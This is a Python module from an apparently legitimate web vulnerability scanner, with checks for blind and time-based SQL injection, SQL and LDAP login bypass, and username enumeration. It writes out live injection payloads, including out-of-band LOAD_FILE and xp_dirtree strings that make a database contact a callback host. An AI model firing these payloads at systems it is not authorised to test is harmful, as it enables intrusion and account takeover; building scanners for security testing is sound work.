"""Deep SQLi family: blind, login bypass, enum, LDAP."""
from __future__ import annotations

import time

from core.colors import warn
from core.net import ScanBudgetExceeded
from core.registry import check as register_check
from core.scan._shared import Finding, SQL_ERRORS, FORM_RE, ACTION_RE
from core.scan.discovery import _inject, _method_re
from core.scan.http import _get, _post
from core.deep._shared import (
    encoded_variants, BOOLEAN_PAIRS, TIME_PAYLOADS, TIME_SLEEP,
    LOGIN_PAYLOADS, LOGIN_OK, LOGIN_USER_HINTS, LOGIN_PASS_HINTS,
    LDAP_BYPASS_USERS, _login_fields, _scrub_hidden,
)


def _ph_resp(tup) -> object:
    """Prefetched (status, body, url) -> response-shaped namespace.

    Prefetch hits always carry a real status (errors are skipped at the
    source), so the namespace is truthy exactly when _post would have
    returned a response.
    """
    from types import SimpleNamespace as _NS
    st, body, url = tup
    return _NS(text=body or "", url=url or "", status_code=st)


@register_check("sqli-blind", "Boolean-blind + encoding bypass + time-based", order=10)
def test_sqli_blind(session, urls: list[str], timeout: int,
                    verbose: bool = False, deep: bool = True,
                    threads: int = 10, oob=None,
                    go_worker: bool = False) -> list[Finding]:
    """Boolean-blind differential + encoding WAF-bypass. Time-based in deep."""
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    targets = urls[:6]
    # Hybrid: base + boolean/ORDER-BY/encoding GETs for every target in one
    # round-trip. The stability re-check stays a live _get, and time-based
    # stays strictly sequential (parallel load would fake a timing signal).
    pre = None
    if go_worker and targets:
        try:
            from core.scan.discovery import _inject as _inj
            from core.scan.injection import _go_prefetch
            injs = [u for u in targets]
            for u in targets:
                for true_p, false_p in BOOLEAN_PAIRS:
                    injs += [_inj(u, true_p), _inj(u, false_p)]
                injs += [_inj(u, " ORDER BY 1-- -"), _inj(u, " ORDER BY 100-- -")]
                injs += [_inj(u, enc) for enc in encoded_variants("'")]
            pre = _go_prefetch(session, injs, timeout, threads)
        except Exception:
            pre = None

    def _fetch(u: str):
        if pre is not None and u in pre:
            st, body = pre[u]
            return (st, body, u)
        return _get(session, u, timeout)

    def _probe(u: str) -> list[Finding]:
        found: list[Finding] = []
        base_got = _fetch(u)
        if not base_got:
            return found
        base_status, base_body, _ = base_got  # _get -> (status, text, url)
        base_low = (base_body or "").lower()
        if any(e in base_low for e in SQL_ERRORS):
            return found  # error-based already caught it, don't repeat

        # -- boolean differential: TRUE ~= baseline, FALSE != baseline
        # statuses must match (else a WAF/filter is mangling things)
        for true_p, false_p in BOOLEAN_PAIRS:
            gt = _fetch(_inject(u, true_p))
            gf = _fetch(_inject(u, false_p))
            if not gt or not gf:
                continue
            gt_status, gt_body, _ = gt
            gf_status, gf_body, _ = gf
            if gt_status != base_status or gf_status != base_status:
                continue  # filter/WAF active, signal unusable
            lt, lf = len(gt_body or ""), len(gf_body or "")
            lb = len(base_body or "")
            true_same = abs(lt - lb) <= max(30, lb // 20)
            false_diff = abs(lf - lb) > max(10, lb // 10)
            # TRUE and FALSE must also differ from each other (else it's echo)
            tf_diff = abs(lt - lf) > max(10, lb // 10)
            if true_same and false_diff and tf_diff:
                # stability re-check: ask FALSE once more
                gf2 = _get(session, _inject(u, false_p), timeout)
                if not gf2 or abs(len(gf2[1] or "") - lf) > max(30, lf // 20):
                    continue
                found.append(Finding(
                    title="Possible Blind SQL Injection (boolean)", severity="CRITICAL",
                    url=u,
                    detail=f"TRUE matches baseline ({lt}B), FALSE differs ({lf}B)",
                    evidence="TRUE vs FALSE delta",
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] Blind SQLi: {u}"))
                break
        if found:
            return found

        # -- UNION column-count differential: ORDER BY 1 is valid SQL, while
        # ORDER BY 100 errors out unless the query has 100+ columns. A status
        # flip (or a big body change with the valid one matching baseline)
        # means the sort clause reached the database.
        gv = _fetch(_inject(u, " ORDER BY 1-- -"))
        gb = _fetch(_inject(u, " ORDER BY 100-- -"))
        if gv and gb:
            vs, vb = gv[0], len(gv[1] or "")
            bs, bb = gb[0], len(gb[1] or "")
            lb = len(base_body or "")
            valid_same = vs == base_status and abs(vb - lb) <= max(30, lb // 20)
            big_differs = (bs != vs) or (abs(bb - vb) > max(100, vb // 10))
            if valid_same and big_differs:
                found.append(Finding(
                    title="Possible SQL Injection (ORDER BY differential)",
                    severity="CRITICAL",
                    url=_inject(u, " ORDER BY 100-- -"),
                    detail=f"ORDER BY 1 matches baseline ({vs}/{vb}B) but "
                           f"ORDER BY 100 diverges ({bs}/{bb}B)",
                    evidence=f"{vs}/{vb}B vs {bs}/{bb}B",
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] SQLi ORDER BY: {u}"))
                return found
        if found:
            return found

        # -- encoding WAF-bypass: raw ' is clean but encoded fires
        for enc in encoded_variants("'"):
            got = _fetch(_inject(u, enc))
            if not got:
                continue
            hit = next((e for e in SQL_ERRORS if e in (got[1] or "").lower()), None)
            if hit:
                found.append(Finding(
                    title="Possible SQLi WAF Bypass (encoding)", severity="CRITICAL",
                    url=_inject(u, enc),
                    detail=f"Encoded payload returned a DB error: '{hit}'",
                    evidence=hit,
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] SQLi bypass: {u}"))
                break
        return found

    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for fs in ex.map(_probe, targets):
            out += fs

    # -- time-based: slow, deep mode + first 5 URLs (SEQUENTIAL requests: no
    # thread-pool load of our own to mistake for a signal)
    if deep:
        def _tprobe(u: str) -> Finding | None:
            t0 = time.time()
            base_got = _get(session, u, timeout + 5)
            base_dt1 = time.time() - t0
            t0 = time.time()
            base_got2 = _get(session, u, timeout + 5)
            base_dt2 = time.time() - t0
            if not base_got or not base_got2:
                return None
            base_max = max(base_dt1, base_dt2)
            if base_max > 2.0:
                return None  # already-slow site, timing is unreliable
            for p in TIME_PAYLOADS:  # MySQL SLEEP + pg_sleep + MSSQL WAITFOR
                inj = _inject(u, p)
                t1 = time.time()
                got = _get(session, inj, timeout + 5)
                dt = time.time() - t1
                if not (got and dt >= TIME_SLEEP - 0.5
                        and dt > base_max + 2.0):
                    continue
                # 2nd data point: confirmation run (rules out net jitter)
                t2 = time.time()
                got2 = _get(session, inj, timeout + 5)
                dt2 = time.time() - t2
                if got2 and dt2 >= TIME_SLEEP - 0.5 and dt2 > base_max + 2.0:
                    if verbose:
                        print(warn(f"    [!] Time-based SQLi: {u} ({dt:.1f}s + {dt2:.1f}s)"))
                    return Finding(
                        title="Possible Time-Based Blind SQLi", severity="CRITICAL",
                        url=inj,
                        detail=f"Response slow on 2 measurements ({dt:.1f}s, {dt2:.1f}s; "
                               f"baseline: {base_dt1:.1f}s/{base_dt2:.1f}s)",
                        evidence=f"sleep({TIME_SLEEP})x2",
                        confidence="Medium",)
            return None

        from core.spinner import spin
        with spin("  [*] Time-based probes (each sleeps seconds)...",
                  enabled=not verbose):
            for u in urls[:5]:
                f = _tprobe(u)
                if f:
                    out.append(f)

    # -- OOB SQLi: fire-and-forget DNS exfiltration, proven by callback.
    # MySQL UNC needs a Windows host + FILE privilege; MSSQL xp_dirtree
    # needs stacked queries. Both conditional — silence on a miss.
    if oob is not None and deep:
        from core.oob import new_token
        for u in urls[:3]:
            token = new_token()
            host = f"{token}.{oob.session_domain}"
            payloads = [
                "' AND (SELECT LOAD_FILE(CONCAT(CHAR(92,92),"
                f"'{host}',CHAR(92,120))))-- -",
                f"';EXEC master..xp_dirtree '//{host}/x'--",
            ]
            placed = False
            for payload in payloads:
                try:
                    placed = _get(session, _inject(u, payload),
                                  timeout) is not None
                except ScanBudgetExceeded:
                    raise
                except Exception:
                    pass
                if placed:
                    break
            if placed:
                oob.pending.append({"kind": "sqli", "target": u,
                                    "token": token})
    return out


@register_check("sqli-login", "Login form SQLi auth-bypass differential", order=10, deep_only=True)
def test_sqli_login(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False, go_worker: bool = False) -> list[Finding]:
    """Password forms: random-user baseline (must fail) vs injection.
    A 'logged in' trace after injection means CRITICAL. Max 3 forms."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
                              "hidden": hidden_vals})
    targets = forms[:3]
    # Per-form payloads up front (users/passes/submit/rnd/base + variants),
    # so one worker round-trip can carry baseline + both injections.
    prepped = []
    for f in targets:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        rnd = f"gashnouser{int(time.time()) % 100000}"
        # hidden fields (CSRF tokens etc.) go back AS-IS: clobber them and
        # the form gets rejected, silently neutering the test.
        base_data = {**{u: rnd for u in users[:1]},
                     **{p: "gashwrongpass" for p in passes[:1]},
                     **submit,
                     **{n: "1" for n in f["fields"] if n not in users[:1]
                        and n not in passes[:1] and n not in submit
                        and n not in f.get("hidden", {})},
                     **f.get("hidden", {})}
        du = dict(base_data)
        du[users[0]] = LOGIN_PAYLOADS[0]
        dp = dict(base_data)
        dp[passes[0]] = LOGIN_PAYLOADS[1]
        prepped.append((f, users[0], passes[0], base_data, du, dp))
    # Hybrid: baseline + both injection variants per form in one round-trip,
    # judged in the original order (user-variant first, then pass-variant).
    pre = None
    if go_worker and prepped:
        try:
            from core.scan.injection import _go_prefetch_posts
            pre = _go_prefetch_posts(
                session,
                [((f["action"], fi, "base"), f["action"], base_data)
                 for fi, (f, _u, _p, base_data, _du, _dp) in enumerate(prepped)] +
                [((f["action"], fi, kind), f["action"], d)
                 for fi, (f, _u, _p, _bd, du, dp) in enumerate(prepped)
                 for kind, d in (("user", du), ("pass", dp))],
                timeout, 10)
        except Exception:
            pre = None
    for fi, (f, u, p, base_data, du, dp) in enumerate(prepped):
        base_hit = (pre or {}).get((f["action"], fi, "base"))
        rb = _ph_resp(base_hit) if base_hit is not None else _post(
            session, f["action"], timeout, data=base_data)
        if not rb:
            continue
        blow = (rb.text or "").lower()
        if any(m in blow for m in LOGIN_OK):
            continue  # baseline already looks 'in' -> measurement unusable
        for kind, data in (("user", du), ("pass", dp)):
            hit = (pre or {}).get((f["action"], fi, kind))
            r = _ph_resp(hit) if hit is not None else _post(
                session, f["action"], timeout, data=data)
            if not r:
                continue
            low = (r.text or "").lower()
            markers = [m for m in LOGIN_OK if m in low]
            corroborate = (abs(len(r.text or "") - len(rb.text or "")) > 200
                            or r.url != rb.url or r.status_code != rb.status_code)
            # 2+ markers alone are enough; one marker needs backup
            if len(markers) >= 2 or (markers and corroborate):
                out.append(Finding(
                    title="Possible SQLi Auth Bypass (login)", severity="CRITICAL",
                    url=f["action"],
                    detail=f"Injection logged in ({', '.join(markers[:3])}); "
                           "random user could not",
                    evidence=f"{u}={LOGIN_PAYLOADS[0][:20]}",
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] SQLi login bypass: {f['action']}"))
                break
    return out


@register_check("login-enum", "Login username enumeration differential", order=10, deep_only=True)
def test_login_enum(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False, go_worker: bool = False) -> list[Finding]:
    """Same wrong password, existing-vs-random username. Different errors
    (or sizes) mean the app tells usernames apart — brute-force fuel.
    Deep only: failed logins touch lockout counters."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
                              "hidden": hidden_vals})
    prepped = []
    for f in forms[:2]:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        rnd = f"gashnouser{int(time.time()) % 100000}"

        def mk(uname: str) -> dict:
            return {**{u: uname for u in users[:1]},
                    **{p: "WrongPass123!" for p in passes[:1]},
                    **submit,
                    **{n: "1" for n in f["fields"] if n not in users[:1]
                       and n not in passes[:1] and n not in submit
                       and n not in f.get("hidden", {})},
                    **f.get("hidden", {})}

        prepped.append((f, mk("admin"), mk(rnd)))
    # Hybrid: existing-vs-random POSTs per form in one round-trip.
    pre = None
    if go_worker and prepped:
        try:
            from core.scan.injection import _go_prefetch_posts
            pre = _go_prefetch_posts(
                session,
                [((f["action"], fi, "admin"), f["action"], da) for fi, (f, da, _db) in enumerate(prepped)] +
                [((f["action"], fi, "rnd"), f["action"], db) for fi, (f, _da, db) in enumerate(prepped)],
                timeout, 10)
        except Exception:
            pre = None
    for fi, (f, da, db) in enumerate(prepped):
        ha = (pre or {}).get((f["action"], fi, "admin"))
        hb = (pre or {}).get((f["action"], fi, "rnd"))
        ra = _ph_resp(ha) if ha is not None else _post(
            session, f["action"], timeout, data=da)
        rb = _ph_resp(hb) if hb is not None else _post(
            session, f["action"], timeout, data=db)
        if not ra or not rb:
            continue
        la = _scrub_hidden(ra.text or "", f.get("hidden", "")).lower()
        lb = _scrub_hidden(rb.text or "", f.get("hidden", "")).lower()
        if any(m in la for m in LOGIN_OK) or any(m in lb for m in LOGIN_OK):
            continue  # someone actually got in — not an enum signal
        uh_a = any(m in la for m in LOGIN_USER_HINTS)
        uh_b = any(m in lb for m in LOGIN_USER_HINTS)
        ph_a = any(m in la for m in LOGIN_PASS_HINTS)
        ph_b = any(m in lb for m in LOGIN_PASS_HINTS)
        if (uh_a or uh_b or ph_a or ph_b) and ((uh_a, ph_a) != (uh_b, ph_b)):
            out.append(Finding(
                title="Login username enumeration", severity="LOW",
                url=f["action"],
                detail="Existing vs random username get different errors; "
                       "usernames are enumerable",
                evidence="differential error text",
                confidence="Medium",))
        elif abs(len(la) - len(lb)) > 300:
            out.append(Finding(
                title="Login username enumeration", severity="LOW",
                url=f["action"],
                detail=f"Existing vs random username differ by "
                       f"{abs(len(la) - len(lb))}B (tokens scrubbed)",
                evidence=f"{len(la)}B vs {len(lb)}B",
                confidence="Low",))
        if verbose and out and out[-1].url == f["action"]:
            print(warn(f"    [!] Login user-enum: {f['action']}"))
    return out


@register_check("ldap-injection", "LDAP wildcard auth bypass", order=10, deep_only=True)
def test_ldap_injection(session, pages: dict, base: str, timeout: int,
                        verbose: bool = False, go_worker: bool = False) -> list[Finding]:
    """LDAP wildcard probes on login forms: `*` as the username with a wrong
    password. A login trace means the filter is concatenated, not escaped.
    Deep only: even failed logins touch lockout counters."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
                              "hidden": hidden_vals})
    prepped = []
    for f in forms[:2]:
        users = [n for n, t in f["fields"].items()
                 if t in ("text", "search", "email", "username", "login", "user", "")]
        passes = [n for n, t in f["fields"].items() if t == "password"]
        if not users or not passes:
            continue
        submit = {n: "Login" for n, t in f["fields"].items()
                  if t in ("submit", "image", "button")}
        datas = []
        for wild in LDAP_BYPASS_USERS:
            datas.append((wild, {**{u: wild for u in users[:1]},
                                 **{p: "WrongPass123!" for p in passes[:1]},
                                 **submit,
                                 **{n: "1" for n in f["fields"] if n not in users[:1]
                                    and n not in passes[:1] and n not in submit
                                    and n not in f.get("hidden", {})},
                                 **f.get("hidden", {})}))
        prepped.append((f, datas))
    # Hybrid: all wildcard POSTs per form in one round-trip, first hit wins.
    pre = None
    if go_worker and prepped:
        try:
            from core.scan.injection import _go_prefetch_posts
            pre = _go_prefetch_posts(
                session,
                [((f["action"], fi, wild), f["action"], d)
                 for fi, (f, datas) in enumerate(prepped)
                 for wild, d in datas],
                timeout, 10)
        except Exception:
            pre = None
    for fi, (f, datas) in enumerate(prepped):
        for wild, data in datas:
            hit = (pre or {}).get((f["action"], fi, wild))
            r = _ph_resp(hit) if hit is not None else _post(
                session, f["action"], timeout, data=data)
            if not r:
                continue
            low = (r.text or "").lower()
            markers = [m for m in LOGIN_OK if m in low]
            corroborate = (r.url != f["action"] or r.status_code in (301, 302))
            if len(markers) >= 2 or (markers and corroborate):
                out.append(Finding(
                    title="Possible LDAP injection (auth bypass)",
                    severity="CRITICAL",
                    url=f["action"],
                    detail=f"Wildcard username '{wild}' logged in "
                           f"({', '.join(markers[:3])})",
                    evidence=wild,
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] LDAP bypass: {f['action']}"))
                break
    return out


__all__ = [
    "test_sqli_blind",
    "test_sqli_login", "test_login_enum", "test_ldap_injection",
]
